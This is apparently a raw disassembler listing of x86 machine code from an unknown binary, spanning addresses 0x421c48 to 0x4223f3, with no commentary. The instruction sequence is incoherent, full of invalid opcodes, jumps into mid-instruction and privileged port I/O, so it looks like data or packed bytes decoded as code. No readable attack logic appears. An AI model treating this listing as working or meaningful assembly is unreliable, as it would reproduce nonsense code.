  421c48:	adc    BYTE PTR [ecx+0x36],bh
  421c4b:	sub    cl,ch
  421c4d:	popf   
  421c4e:	frstor ds:0xeb28b87e
  421c54:	les    esi,FWORD PTR [esi+0x33]
  421c57:	mov    esi,0xb103c87a
  421c5c:	aaa    
  421c5d:	ret    0x35e3
  421c60:	cmp    BYTE PTR ds:0xe34f4961,bh
  421c66:	stos   DWORD PTR es:[edi],eax
  421c67:	inc    ebx
  421c68:	adc    eax,0xfbc385
  421c6d:	inc    esp
  421c6e:	add    al,0xac
  421c70:	sar    DWORD PTR [ecx],0xd5
  421c73:	jmp    0x421ca2
  421c75:	mov    ds:0xbff68966,al
  421c7a:	fsubr  st,st(5)
  421c7c:	(bad)  
  421c7d:	jle    0x421cea
  421c7f:	fist   WORD PTR [ecx+0x7ba00b04]
  421c85:	inc    edx
  421c86:	ror    BYTE PTR [esp+eiz*8+0x51],cl
  421c8a:	fwait
  421c8b:	dec    edx
  421c8c:	cmp    al,0x76
  421c8e:	jns    0x421c43
  421c90:	xor    DWORD PTR ds:0x147e3768,ebx
  421c96:	jmp    0x421c91
  421c98:	fld    DWORD PTR [edx+ebx*1+0x4a]
  421c9c:	jbe    0x421caa
  421c9e:	lea    eax,ds:0x522110fa
  421ca4:	mov    bl,0x51
  421ca6:	js     0x421cd3
  421ca8:	push   ds
  421ca9:	push   ecx
  421caa:	mov    eax,0x4b322aa
  421caf:	not    BYTE PTR [ecx+eax*1+0x7cd34748]
  421cb6:	jns    0x421ca9
  421cb8:	mov    bh,0x89
  421cba:	jnp    0x421ce1
  421cbc:	dec    ecx
  421cbd:	jl     0x421c4d
  421cbf:	fbstp  TBYTE PTR [ebp+0x1e]
  421cc2:	jns    0x421d38
  421cc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cc6:	add    BYTE PTR [edx+0x67],0x68
  421cca:	dec    ebp
  421ccb:	mov    ebp,0x18175e8b
  421cd0:	lods   al,BYTE PTR ds:[esi]
  421cd1:	and    cl,ch
  421cd3:	jbe    0x421d2d
  421cd5:	mov    bh,0xcb
  421cd7:	jecxz  0x421cf4
  421cd9:	and    DWORD PTR [ecx],esp
  421cdb:	scas   eax,DWORD PTR es:[edi]
  421cdc:	ja     0x421d0b
  421cde:	ja     0x421cd4
  421ce0:	dec    eax
  421ce1:	push   ss
  421ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ce3:	push   eax
  421ce4:	(bad)  
  421ce6:	jnp    0x421c77
  421ce8:	shl    ch,0xaf
  421ceb:	ins    BYTE PTR es:[edi],dx
  421cec:	xchg   BYTE PTR [edx],cl
  421cee:	out    dx,al
  421cef:	rcl    ebx,1
  421cf1:	fcomp  DWORD PTR [eax-0x1d]
  421cf4:	sbb    BYTE PTR [edi],dl
  421cf6:	push   0x59f03c50
  421cfb:	pop    edx
  421cfc:	aam    0xae
  421cfe:	xor    DWORD PTR [ecx],0x6ab7d03d
  421d04:	clc    
  421d05:	push   ebp
  421d06:	imul   eax,DWORD PTR [ecx],0x992848c
  421d0c:	arpl   WORD PTR [edi],bp
  421d0e:	(bad)  
  421d0f:	pop    ss
  421d10:	fwait
  421d11:	xchg   edi,eax
  421d12:	dec    esi
  421d13:	sub    eax,0x7e574882
  421d18:	or     eax,0xfb1b1844
  421d1d:	retf   
  421d1e:	cmp    ch,0x4d
  421d21:	int    0x19
  421d23:	adc    ah,BYTE PTR [eax+0x232170a8]
  421d29:	pop    es
  421d2a:	cs mov bl,0xe5
  421d2d:	test   al,0xcc
  421d2f:	mov    al,ds:0x8c1832eb
  421d34:	bound  edi,QWORD PTR [edi-0x3f]
  421d37:	in     eax,dx
  421d38:	js     0x421d28
  421d3a:	mov    edi,0xcb02440
  421d3f:	push   ebx
  421d40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d41:	imul   eax,DWORD PTR [ecx],0x778e3bd3
  421d47:	rol    ebp,0x68
  421d4a:	jmp    0x5e3b:0x3770f438
  421d51:	fisub  DWORD PTR [edi-0xa]
  421d54:	stc    
  421d55:	(bad)  
  421d56:	fcom   QWORD PTR [ecx]
  421d58:	idiv   ch
  421d5a:	sahf   
  421d5b:	pshufw mm2,mm2,0xe1
  421d5f:	(bad)  
  421d60:	retf   0x9d07
  421d63:	push   ecx
  421d64:	dec    esi
  421d65:	inc    ecx
  421d66:	pop    esi
  421d67:	mov    ch,BYTE PTR [eax]
  421d69:	xor    ch,cl
  421d6b:	dec    ecx
  421d6c:	or     esi,ebp
  421d6e:	dec    eax
  421d6f:	in     al,dx
  421d70:	inc    edx
  421d71:	adc    dh,BYTE PTR [ecx-0x58]
  421d74:	cmp    BYTE PTR [ebp+0x74],al
  421d77:	test   bh,dh
  421d79:	push   edx
  421d7a:	mov    ss,WORD PTR [edx-0x17]
  421d7d:	inc    esi
  421d7e:	mov    BYTE PTR [eax],ah
  421d80:	jnp    0x421d06
  421d82:	add    BYTE PTR [esi-0x5b],ch
  421d85:	xchg   edi,eax
  421d86:	ins    DWORD PTR es:[edi],dx
  421d87:	mov    ds:0xb5813307,ax
  421d8d:	out    0x23,eax
  421d8f:	int    0xbe
  421d91:	jmp    0xeb8072cd
  421d96:	jmp    0xf873:0x1590d677
  421d9d:	stos   DWORD PTR es:[edi],eax
  421d9e:	int    0xf5
  421da0:	sub    al,0x4e
  421da2:	adc    DWORD PTR ds:0xd596a6b3,edi
  421da8:	adc    al,0xd7
  421daa:	(bad)  
  421dab:	rol    eax,0x27
  421dae:	push   ebx
  421daf:	aaa    
  421db0:	test   al,0x4b
  421db2:	xchg   BYTE PTR [esi+0xb],cl
  421db5:	mov    edi,0x160cf7bd
  421dba:	or     dh,BYTE PTR [eax-0x46e68f31]
  421dc0:	hlt    
  421dc1:	cwde   
  421dc2:	stos   BYTE PTR es:[edi],al
  421dc3:	adc    eax,0xd15ccdfb
  421dc8:	sub    ecx,edi
  421dca:	ins    BYTE PTR es:[edi],dx
  421dcb:	jmp    0x80d26dff
  421dd0:	enter  0x39f8,0x2e
  421dd4:	mov    bl,ch
  421dd6:	std    
  421dd7:	mov    ebp,0xf8d31377
  421ddc:	inc    eax
  421ddd:	std    
  421dde:	sbb    ch,0xc9
  421de1:	sbb    al,0x89
  421de3:	lock aam 0xe8
  421de6:	js     0x421da7
  421de8:	ins    DWORD PTR es:[edi],dx
  421de9:	push   ebp
  421dea:	and    BYTE PTR [esi-0x4],bl
  421ded:	or     DWORD PTR [edi-0x73],ecx
  421df0:	or     DWORD PTR [esp+edx*8+0xfec2c6c],edi
  421df7:	sbb    al,0x7e
  421df9:	nop
  421dfa:	call   0x8f5e:0x1e2076b5
  421e01:	pop    esp
  421e02:	sub    al,0xa6
  421e04:	jns    0x421d99
  421e06:	sub    al,0xb8
  421e08:	sub    dl,ch
  421e0a:	adc    eax,0x592556c7
  421e0f:	fcomi  st,st(4)
  421e11:	idiv   BYTE PTR [ecx+0x1926b8f7]
  421e17:	or     ah,BYTE PTR ds:0x25990ade
  421e1d:	push   ds
  421e1e:	sub    eax,0xa5e0ed4f
  421e23:	fwait
  421e24:	push   edi
  421e25:	push   ss
  421e26:	dec    esi
  421e27:	pop    edi
  421e28:	aam    0x56
  421e2a:	adc    bl,ah
  421e2c:	jno    0x421e21
  421e2e:	test   al,0xbb
  421e30:	sar    esp,cl
  421e32:	sbb    al,0x7a
  421e34:	lock dec esp
  421e36:	cs das 
  421e38:	push   esp
  421e39:	cmp    cl,BYTE PTR [eax+0xe]
  421e3c:	ror    ecx,0x98
  421e3f:	bound  ax,DWORD PTR [ebp+0x46eb0b18]
  421e46:	sbb    al,0x30
  421e48:	and    DWORD PTR [esi+edx*8-0x67],edx
  421e4c:	pop    edx
  421e4d:	inc    esp
  421e4e:	mov    bh,0xc0
  421e50:	mov    edi,0xab316a43
  421e55:	jae    0x421e35
  421e57:	lods   al,BYTE PTR ds:[esi]
  421e58:	jnp    0x421ebe
  421e5a:	cdq    
  421e5b:	lds    ebp,FWORD PTR [ebx-0x1a]
  421e5e:	fsubr  QWORD PTR [esi]
  421e60:	gs out 0x46,eax
  421e63:	mov    ebp,0x72206fcf
  421e68:	adc    eax,0x51bbffa8
  421e6d:	pop    ds
  421e6e:	push   ss
  421e6f:	inc    esi
  421e70:	out    0x87,al
  421e72:	sub    bl,cl
  421e74:	les    edx,FWORD PTR [ebx+0x4d]
  421e77:	dec    ecx
  421e78:	or     edx,ebp
  421e7a:	out    0x91,eax
  421e7c:	sbb    bl,dl
  421e7e:	daa    
  421e7f:	pop    ecx
  421e80:	nop
  421e81:	loopne 0x421e2c
  421e83:	lds    esi,FWORD PTR [edi]
  421e85:	adc    al,BYTE PTR [ecx+0x42]
  421e88:	int    0xca
  421e8a:	loop   0x421ebb
  421e8c:	dec    eax
  421e8d:	jbe    0x421e80
  421e8f:	ss inc ebp
  421e91:	aad    0xaf
  421e93:	mov    esi,0x5b1e2d3d
  421e98:	jmp    0x56ae8b14
  421e9d:	xor    ebp,edi
  421e9f:	stos   DWORD PTR es:[edi],eax
  421ea0:	mov    WORD PTR [edi+0x3b72420],?
  421ea6:	jns    0x421ef4
  421ea8:	jg     0x421e5f
  421eaa:	inc    ecx
  421eab:	xor    al,0x70
  421ead:	mov    esi,DWORD PTR [ebx+esi*8]
  421eb0:	mov    dl,dl
  421eb2:	pop    edx
  421eb3:	cmp    dl,BYTE PTR [esi+0x54]
  421eb6:	nop
  421eb7:	fdiv   DWORD PTR [esi-0x73]
  421eba:	push   esp
  421ebb:	cmp    ah,BYTE PTR [ebx-0x37]
  421ebe:	cld    
  421ebf:	add    dl,BYTE PTR [edi]
  421ec1:	cmp    BYTE PTR [edx+eax*4-0x39],ah
  421ec5:	push   dx
  421ec7:	out    dx,al
  421ec8:	xor    DWORD PTR [edx-0x75e7acd2],ebp
  421ece:	xchg   DWORD PTR [ebx+0x2d],ebx
  421ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ed2:	stos   BYTE PTR es:[edi],al
  421ed3:	cdq    
  421ed4:	dec    esi
  421ed5:	into   
  421ed6:	xor    ah,bl
  421ed8:	scas   eax,DWORD PTR es:[edi]
  421ed9:	pusha  
  421eda:	adc    edx,eax
  421edc:	add    al,0x74
  421ede:	pop    es
  421edf:	sbb    BYTE PTR [edi+0x55e8cabc],bl
  421ee5:	jae    0x421eea
  421ee7:	jge    0x421e8c
  421ee9:	scas   eax,DWORD PTR es:[di]
  421eeb:	add    dl,BYTE PTR [ecx+0x34966aca]
  421ef1:	shr    BYTE PTR [edx-0x58],1
  421ef4:	and    eax,0xf89c4c8d
  421ef9:	adc    esi,DWORD PTR [eax]
  421efb:	mov    esi,0x2dc895f6
  421f00:	cmp    dh,dl
  421f02:	stc    
  421f03:	cdq    
  421f04:	iret   
  421f05:	(bad)  
  421f07:	sbb    eax,0xf6d1688e
  421f0c:	and    eax,DWORD PTR [esi]
  421f0e:	inc    eax
  421f0f:	jae    0x421f01
  421f11:	mov    WORD PTR [ebp+0x62],gs
  421f14:	sbb    DWORD PTR [ecx],0x54687c99
  421f1a:	pop    ebp
  421f1b:	xchg   edi,eax
  421f1c:	lods   eax,DWORD PTR ds:[esi]
  421f1d:	xchg   edx,eax
  421f1e:	xor    BYTE PTR [ebp+0x4937d71a],dh
  421f24:	in     eax,0x7a
  421f26:	sahf   
  421f27:	mov    edx,0x3b7a9772
  421f2c:	es aam 0xaa
  421f2f:	cmp    al,0xf1
  421f31:	int    0x70
  421f33:	dec    edx
  421f34:	daa    
  421f35:	mov    ds:0xe1c60b7b,al
  421f3a:	cmp    DWORD PTR [edi-0x66],edi
  421f3d:	mov    edx,0xd45f8db0
  421f42:	add    ah,BYTE PTR [edx+edx*1]
  421f45:	mov    ah,0x4b
  421f47:	in     al,0x54
  421f49:	icebp  
  421f4a:	fidivr WORD PTR [edi+0x70]
  421f4d:	out    dx,eax
  421f4e:	dec    esi
  421f4f:	push   ds
  421f50:	jge    0x421f8b
  421f52:	push   edi
  421f53:	fucom  st(5)
  421f55:	pop    edx
  421f56:	imul   DWORD PTR [edx]
  421f58:	cwde   
  421f59:	sub    DWORD PTR [esi-0x3c245b1d],esp
  421f5f:	add    esp,esp
  421f61:	xor    DWORD PTR [edx-0x47],ecx
  421f64:	loope  0x421f31
  421f66:	mov    ds:0xf731bcac,al
  421f6b:	push   ecx
  421f6c:	and    al,0x50
  421f6e:	popf   
  421f6f:	and    bh,dl
  421f71:	fstp   st(3)
  421f73:	add    ch,BYTE PTR [ecx]
  421f75:	xor    eax,0xf0562d21
  421f7a:	scas   al,BYTE PTR es:[edi]
  421f7b:	mov    ebp,0x49d6e34
  421f80:	mov    esp,edi
  421f82:	jecxz  0x421f50
  421f84:	repz and eax,0xd18e6254
  421f8a:	sbb    DWORD PTR [eax],edi
  421f8c:	push   edi
  421f8d:	mov    ecx,0x6d934b6b
  421f92:	xor    bl,BYTE PTR [edi+ecx*2]
  421f95:	ud0    ebx,DWORD PTR [esi+eiz*8+0x65]
  421f9a:	mov    eax,0xc940ed88
  421f9f:	(bad)  
  421fa1:	sar    BYTE PTR [ebx+0x348da6e4],1
  421fa7:	out    dx,eax
  421fa8:	fnstenv [edi+0x5c]
  421fab:	add    al,0xb3
  421fad:	sub    esi,DWORD PTR ds:0x21322164
  421fb3:	jbe    0x42200c
  421fb5:	push   ds
  421fb6:	and    BYTE PTR [eax+0x10],al
  421fb9:	bound  esp,QWORD PTR [ebx+0x48]
  421fbc:	mov    edx,0xe86c9f90
  421fc1:	adc    edi,DWORD PTR [ebp+0x4c75528b]
  421fc7:	pop    ecx
  421fc8:	test   DWORD PTR [eax+0x4f],ebp
  421fcb:	xchg   edx,eax
  421fcc:	cmp    BYTE PTR [ecx],ch
  421fce:	fistp  QWORD PTR [eax+ebx*2]
  421fd1:	inc    ecx
  421fd2:	pop    ebp
  421fd3:	inc    ebx
  421fd4:	mov    ah,0xa0
  421fd6:	fnstenv [edi+eax*4]
  421fd9:	inc    esp
  421fda:	jp     0x421fbc
  421fdc:	adc    al,0x58
  421fde:	push   0x37
  421fe0:	sub    BYTE PTR [eax-0x35dc771d],ch
  421fe6:	into   
  421fe7:	mov    eax,ds:0xddaa02af
  421fec:	push   edi
  421fed:	and    eax,ebp
  421fef:	cld    
  421ff0:	sti    
  421ff1:	pop    ebx
  421ff2:	jge    0x421f96
  421ff4:	jge    0x421fcd
  421ff6:	mov    dh,0xf0
  421ff8:	jno    0x422055
  421ffa:	and    bh,BYTE PTR [edi-0x8]
  421ffd:	jp     0x42206d
  421fff:	addr16 je 0x42200e
  422002:	or     BYTE PTR [edx+0x78],bl
  422005:	out    0xcb,eax
  422007:	sbb    eax,0x771a207e
  42200c:	or     DWORD PTR [ebx+ebx*4],0x447c0655
  422013:	jno    0x422005
  422015:	retf   
  422016:	cli    
  422017:	push   ss
  422018:	push   ecx
  422019:	dec    esi
  42201a:	outs   dx,BYTE PTR ds:[esi]
  42201b:	mov    eax,ds:0x65976204
  422020:	clc    
  422021:	test   eax,0xa1928ae9
  422026:	dec    ebp
  422027:	or     eax,0xb2b8101e
  42202c:	lahf   
  42202d:	jge    0x421fda
  42202f:	xchg   ebp,eax
  422030:	push   cs
  422031:	adc    DWORD PTR ds:0x20f70f67,edx
  422037:	or     ch,dl
  422039:	inc    edx
  42203a:	in     eax,dx
  42203b:	xor    eax,0x9a4ebf8e
  422040:	cmp    al,0x8d
  422042:	adc    al,0xa1
  422044:	and    ah,BYTE PTR ds:[eax]
  422047:	push   edi
  422048:	fidivr WORD PTR [ebp-0x77]
  42204b:	dec    edi
  42204c:	dec    edi
  42204d:	adc    BYTE PTR [eax+0x7e7df7a0],bl
  422053:	sbb    ecx,DWORD PTR [ecx]
  422055:	mov    dh,0x78
  422057:	arpl   WORD PTR [edx],dx
  422059:	mov    esp,0xa5055c0b
  42205e:	dec    eax
  42205f:	test   BYTE PTR [esi],ch
  422061:	inc    ebx
  422062:	ja     0x422061
  422064:	mov    ah,BYTE PTR [ecx]
  422066:	cwde   
  422067:	or     ecx,DWORD PTR [edx]
  422069:	shr    BYTE PTR [esi+0x4b2c2407],0x45
  422070:	mov    eax,0x68beb7fd
  422075:	dec    edx
  422076:	mov    edi,0x5d918eab
  42207b:	icebp  
  42207c:	adc    cl,BYTE PTR [ebp+0x4e]
  42207f:	(bad)  
  422080:	stos   DWORD PTR es:[edi],eax
  422081:	ror    ch,0xd0
  422084:	lea    ebx,[edx]
  422086:	cmp    DWORD PTR [esi+ebp*1-0x213ec80f],0x1e21da8c
  422091:	aam    0x6e
  422093:	ret    
  422094:	xchg   ebx,eax
  422095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422096:	lahf   
  422097:	push   DWORD PTR [esi-0x9]
  42209a:	enter  0xdb6b,0xbf
  42209e:	sahf   
  42209f:	int    0x9f
  4220a1:	jecxz  0x4220c7
  4220a3:	sahf   
  4220a4:	xor    DWORD PTR [ebp-0x45],edi
  4220a7:	stos   DWORD PTR es:[edi],eax
  4220a8:	test   DWORD PTR [edi],esi
  4220aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220ab:	outs   dx,DWORD PTR ds:[esi]
  4220ac:	mov    cl,0x12
  4220ae:	std    
  4220af:	mov    al,ds:0xf9e7500a
  4220b4:	imul   esi,DWORD PTR [edi-0x4c],0x497685d4
  4220bb:	ficomp DWORD PTR [edx+ebp*2+0x3794ad18]
  4220c2:	jno    0x42207d
  4220c4:	bound  ecx,QWORD PTR [ebp+edi*1+0x7faf285d]
  4220cb:	or     dh,dh
  4220cd:	shl    DWORD PTR [eax+eax*2-0x25],cl
  4220d1:	in     eax,dx
  4220d2:	test   eax,0x1483229
  4220d7:	call   0xbfb572fa
  4220dc:	call   0x877d:0x49c9c79
  4220e3:	outs   dx,BYTE PTR ds:[esi]
  4220e4:	repz mov esp,0x8a63eb31
  4220ea:	test   BYTE PTR [esi-0x3],bl
  4220ed:	xchg   edx,eax
  4220ee:	cmp    al,0x7d
  4220f0:	mov    eax,0x149574e4
  4220f5:	inc    edi
  4220f6:	jne    0x422150
  4220f8:	mov    ?,WORD PTR [edx+0x37d9a3bb]
  4220fe:	ret    0xc946
  422101:	in     eax,dx
  422102:	stos   DWORD PTR es:[edi],eax
  422103:	push   eax
  422104:	(bad)  
  422105:	jo     0x422107
  422107:	outs   dx,BYTE PTR ds:[esi]
  422108:	enter  0x4ef2,0x61
  42210c:	mov    DWORD PTR [ebx-0x23],edi
  42210f:	jge    0x4220c6
  422111:	adc    eax,esp
  422113:	cmp    ch,ch
  422115:	jno    0x4220c6
  422117:	dec    esp
  422118:	daa    
  422119:	push   ecx
  42211a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42211b:	pop    edx
  42211d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42211e:	add    DWORD PTR [edx+0x1bdafa],ecx
  422124:	cmp    esp,DWORD PTR [edi]
  422126:	mov    bl,0xe5
  422128:	xlat   BYTE PTR ds:[ebx]
  422129:	(bad)  
  42212a:	fimul  WORD PTR [ebp-0x68]
  42212d:	xor    dh,al
  42212f:	cmc    
  422130:	rol    DWORD PTR [eax+edx*1-0x7],1
  422134:	rcr    DWORD PTR [edi],cl
  422136:	or     eax,0x2d91f094
  42213b:	push   esp
  42213c:	pop    ss
  42213d:	fcomp  QWORD PTR [ebx+0x70]
  422140:	push   es
  422141:	hlt    
  422142:	or     BYTE PTR [ecx-0x70],ah
  422145:	or     eax,0x633e8171
  42214a:	mov    ds:0x56edce25,eax
  42214f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422150:	and    ecx,DWORD PTR [ebx-0x2d]
  422153:	pusha  
  422154:	mov    ds:0x8393e7c4,eax
  422159:	adc    bl,BYTE PTR [edi-0x1d]
  42215c:	popf   
  42215d:	mul    DWORD PTR [ecx-0x56bc529c]
  422163:	xor    dh,BYTE PTR [ecx-0x57460546]
  422169:	add    ebx,DWORD PTR [ebp+0x4e3466e4]
  42216f:	add    BYTE PTR [ebx-0x79fd1eaf],dh
  422175:	enter  0xea91,0xd0
  422179:	call   FWORD PTR [ecx+edx*4+0xda34745]
  422180:	push   edi
  422181:	icebp  
  422182:	sub    al,0x2b
  422184:	adc    DWORD PTR ds:0x9e21e874,ebx
  42218a:	mov    edi,DWORD PTR [ecx-0x3e12d16a]
  422190:	jle    0x4221de
  422192:	pop    ss
  422193:	fbld   TBYTE PTR [edi-0x4f]
  422196:	xor    al,0x7
  422198:	test   eax,0xfdd5a11e
  42219d:	bound  ecx,QWORD PTR [ebx]
  42219f:	pop    ecx
  4221a0:	fwait
  4221a1:	mov    al,ds:0xdc330bd0
  4221a6:	and    BYTE PTR [edi-0x711235e6],al
  4221ac:	cmp    edx,edi
  4221ae:	(bad)  [esi]
  4221b0:	jno    0x422217
  4221b2:	retf   0x432b
  4221b5:	cmp    bl,cl
  4221b7:	sbb    BYTE PTR [ebx-0x63],bh
  4221ba:	lock cmp al,0x36
  4221bd:	pop    ecx
  4221be:	or     eax,0xebde0b58
  4221c3:	ror    BYTE PTR [ecx+0x1dd38343],1
  4221c9:	sub    DWORD PTR [ecx+ebx*1],ecx
  4221cc:	bound  edx,QWORD PTR [edx+0x43]
  4221cf:	retf   0xf25
  4221d2:	ins    BYTE PTR es:[edi],dx
  4221d3:	mov    ah,0x15
  4221d5:	je     0x4221a7
  4221d7:	std    
  4221d8:	mul    ecx
  4221da:	cmp    al,0x64
  4221dc:	je     0x422195
  4221de:	in     eax,dx
  4221df:	retf   0x8f98
  4221e2:	sub    dh,cl
  4221e4:	cli    
  4221e5:	in     eax,0x6a
  4221e7:	jo     0x422249
  4221e9:	jg     0x4221ac
  4221eb:	outs   dx,BYTE PTR ds:[esi]
  4221ec:	daa    
  4221ed:	xchg   ebp,eax
  4221ee:	jb     0x422215
  4221f0:	in     al,0x4
  4221f2:	lea    esp,[edi+0x654b643a]
  4221f8:	cli    
  4221f9:	adc    BYTE PTR [edi+0x2d51aaaf],ah
  4221ff:	xchg   DWORD PTR [edi+0x30],ebx
  422202:	cli    
  422203:	jecxz  0x4221e2
  422205:	lock aas 
  422207:	gs ins DWORD PTR es:[edi],dx
  422209:	pop    edx
  42220a:	seta   BYTE PTR [esi+0x5e]
  42220e:	(bad)  
  42220f:	dec    ebx
  422210:	popa   
  422211:	dec    edi
  422212:	jmp    0x42221d
  422214:	xor    DWORD PTR [edx-0x2a],edx
  422217:	sbb    eax,0xc6677293
  42221c:	mov    cs:0x6b466172,al
  422222:	mov    ds:0x301a6085,al
  422227:	ins    DWORD PTR es:[edi],dx
  422228:	popa   
  422229:	mov    bh,0x29
  42222b:	mov    al,0xcb
  42222d:	in     eax,dx
  42222e:	cld    
  42222f:	sahf   
  422230:	aaa    
  422231:	loop   0x42225c
  422233:	sahf   
  422234:	dec    eax
  422235:	or     dl,ah
  422237:	inc    eax
  422238:	pop    edx
  422239:	stc    
  42223a:	pop    esp
  42223b:	mov    esi,0x71a44685
  422240:	or     al,BYTE PTR [edi-0x4cd76f5]
  422246:	in     al,0x90
  422248:	stos   DWORD PTR es:[edi],eax
  422249:	loop   0x422247
  42224b:	loope  0x4222c4
  42224d:	out    dx,eax
  42224e:	clc    
  42224f:	add    al,0x26
  422251:	inc    ecx
  422252:	mov    al,ds:0x766c297a
  422257:	push   0xb2602f94
  42225c:	test   DWORD PTR [ebp-0x535e56c],edi
  422262:	ds add al,0x3a
  422265:	adc    esi,DWORD PTR [ecx+ecx*4-0x48]
  422269:	inc    bx
  42226b:	jle    0x422246
  42226d:	arpl   si,bx
  42226f:	inc    edx
  422270:	or     al,0x60
  422272:	or     al,0x32
  422274:	xor    cl,BYTE PTR [eax+0x719a6bad]
  42227a:	jecxz  0x42229e
  42227c:	stc    
  42227d:	xor    ah,ch
  42227f:	push   esp
  422280:	or     BYTE PTR [esi+0x48],ah
  422283:	ficomp DWORD PTR [edi+0x1018976c]
  422289:	ror    BYTE PTR [edx+0x39],cl
  42228c:	mov    al,ds:0x13bbd733
  422291:	xor    eax,0x8a8c908e
  422296:	test   al,0x97
  422298:	push   edx
  422299:	xchg   ebp,eax
  42229a:	or     BYTE PTR [edx-0x40],al
  42229d:	fisubr DWORD PTR [esi-0x624a7977]
  4222a3:	invd   
  4222a5:	xor    ebx,DWORD PTR [eax-0x44630b6]
  4222ab:	push   esp
  4222ac:	rcr    BYTE PTR [ebp+0x45],1
  4222af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222b0:	xor    BYTE PTR [esi-0x52],bl
  4222b3:	mov    ebp,0x9a133f6e
  4222b8:	into   
  4222b9:	sub    al,0x69
  4222bb:	neg    ebp
  4222bd:	dec    ecx
  4222be:	add    bh,al
  4222c0:	popf   
  4222c1:	ss gs mov ecx,0x60431421
  4222c8:	sbb    eax,0xad63b435
  4222cd:	lock ja 0x422271
  4222d0:	cmp    DWORD PTR [edx+ecx*1+0x7],ebp
  4222d4:	sub    eax,0x329e55cb
  4222d9:	sbb    eax,0xca0ae698
  4222de:	push   ebp
  4222df:	mov    edx,0xc900c4a0
  4222e4:	cmc    
  4222e5:	dec    eax
  4222e6:	popf   
  4222e7:	call   0x1799:0x7ede1171
  4222ee:	lods   al,BYTE PTR ds:[esi]
  4222ef:	clc    
  4222f0:	push   ecx
  4222f1:	and    BYTE PTR [ebx+eax*4],cl
  4222f4:	mov    esp,0x22fee0c3
  4222f9:	mov    al,ds:0xeb99b9f0
  4222fe:	sub    eax,edx
  422300:	or     ecx,ebp
  422302:	rol    BYTE PTR [edi+0x74],0x88
  422306:	push   0x30
  422308:	cmp    bl,BYTE PTR [esi]
  42230a:	les    edi,FWORD PTR [ebx]
  42230c:	jns    0x422319
  42230e:	jns    0x4222d6
  422310:	push   eax
  422311:	dec    edi
  422312:	jge    0x4222f5
  422314:	cmp    al,bh
  422316:	mov    esp,0x4e4c4f8f
  42231b:	test   edi,edi
  42231d:	fistp  WORD PTR [ebp+esi*2-0x31]
  422321:	pop    edx
  422322:	push   ss
  422323:	mov    es,WORD PTR [eax+0x7d]
  422326:	mov    ds,WORD PTR [ebx]
  422328:	pop    eax
  422329:	xchg   edx,eax
  42232a:	mov    edi,DWORD PTR [edi-0x7d]
  42232d:	mov    al,0x9e
  42232f:	sub    bh,ch
  422331:	inc    ebp
  422332:	inc    edx
  422333:	popf   
  422334:	dec    ebp
  422335:	mov    BYTE PTR [ebp-0x30e21abd],bl
  42233b:	gs xchg edi,eax
  42233d:	sti    
  42233e:	pop    ebx
  42233f:	pop    ecx
  422340:	scas   eax,DWORD PTR es:[edi]
  422341:	jl     0x422304
  422343:	aaa    
  422344:	cmp    dh,BYTE PTR [ebp+0x78]
  422347:	stos   BYTE PTR es:[edi],al
  422348:	sar    BYTE PTR [esi],0x98
  42234b:	pushaw 
  42234d:	xor    al,0x9f
  42234f:	out    0x59,eax
  422351:	sahf   
  422352:	shr    BYTE PTR [ebx+0x3abdf874],0x18
  422359:	scas   al,BYTE PTR es:[edi]
  42235a:	jmp    0x43a2:0xd1e453f9
  422361:	arpl   WORD PTR [edi+esi*4+0x168d428],ax
  422368:	jns    0x4223cb
  42236a:	sub    eax,0xfe722cd4
  42236f:	add    BYTE PTR [edi],cl
  422371:	mov    edx,0x7c66c82c
  422376:	sub    bh,BYTE PTR [bx+di-0x6f]
  42237a:	cmp    al,0x3
  42237c:	fnsave [ebx]
  42237e:	out    0x49,al
  422380:	jno    0x4223a2
  422382:	jle    0x42238a
  422384:	sub    al,0xcc
  422386:	mov    ebx,?
  422388:	cmp    eax,0xdeef7ae
  42238d:	pop    es
  42238e:	(bad)  
  42238f:	stc    
  422390:	cmp    BYTE PTR [ebp-0x495eb805],0xf8
  422397:	dec    eax
  422398:	jo     0x4223f1
  42239a:	push   ds
  42239b:	inc    ecx
  42239c:	out    dx,eax
  42239d:	fcom   DWORD PTR [eax+ebx*8+0x8]
  4223a1:	lods   al,BYTE PTR ds:[esi]
  4223a2:	call   0x8ffffcaa
  4223a7:	adc    eax,DWORD PTR [edi-0x4ba89755]
  4223ad:	ret    
  4223ae:	scas   al,BYTE PTR es:[edi]
  4223af:	outs   dx,BYTE PTR ds:[esi]
  4223b0:	mov    ch,0x9a
  4223b2:	inc    ebp
  4223b3:	sub    edi,DWORD PTR [eax]
  4223b5:	lods   eax,DWORD PTR ds:[esi]
  4223b6:	dec    si
  4223b8:	pop    ds
  4223b9:	dec    edx
  4223ba:	rcl    DWORD PTR [ecx-0x610cae14],1
  4223c0:	add    eax,eax
  4223c2:	test   ecx,ecx
  4223c4:	xor    al,BYTE PTR [esi]
  4223c6:	mov    bh,0x1
  4223c8:	sub    al,0xf4
  4223ca:	stos   BYTE PTR es:[edi],al
  4223cb:	out    0xb9,al
  4223cd:	outs   dx,DWORD PTR ds:[esi]
  4223ce:	jb     0x4223fc
  4223d0:	pop    ecx
  4223d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223d2:	jbe    0x4223f5
  4223d4:	outs   dx,BYTE PTR ds:[esi]
  4223d5:	pusha  
  4223d6:	adc    DWORD PTR [edx-0x32],eax
  4223d9:	add    al,0xe5
  4223db:	leave  
  4223dc:	xlat   BYTE PTR ds:[ebx]
  4223dd:	ins    DWORD PTR es:[edi],dx
  4223de:	or     ebx,DWORD PTR [esi-0x2f410b2e]
  4223e4:	mov    esi,0x49f63b8e
  4223e9:	and    edx,DWORD PTR [ecx-0x24]
  4223ec:	fisttp QWORD PTR [ebx-0xd]
  4223ef:	xchg   esp,eax
  4223f0:	cmp    al,0x35
  4223f2:	push   edi
  4223f3:	retf   0xb87f
